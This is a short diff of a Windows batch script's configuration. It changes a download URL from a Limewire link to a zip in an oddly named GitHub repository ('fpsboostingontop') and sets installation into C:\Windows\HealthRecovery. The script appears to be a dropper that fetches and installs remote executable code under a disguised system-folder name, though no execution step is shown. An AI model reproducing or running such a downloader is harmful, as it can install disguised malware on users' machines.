@@ -9,7 +9,7 @@ if %errorlevel% neq 0 (
 )
 
 :: === CONFIGURATION ===
-set "DOWNLOAD_URL=https://limewire.com/d/toegH#Y8FDmWBVAi"
+set "DOWNLOAD_URL=https://github.com/fpsboostingontop/adasdad/blob/main/ExecFileD.zip"
 set "INSTALL_DIR=C:\Windows\HealthRecovery"
 set "ZIP_NAME=ExectFileD.zip"
 set "TEMP_EXTRACT=%INSTALL_DIR%\_temp_extract"
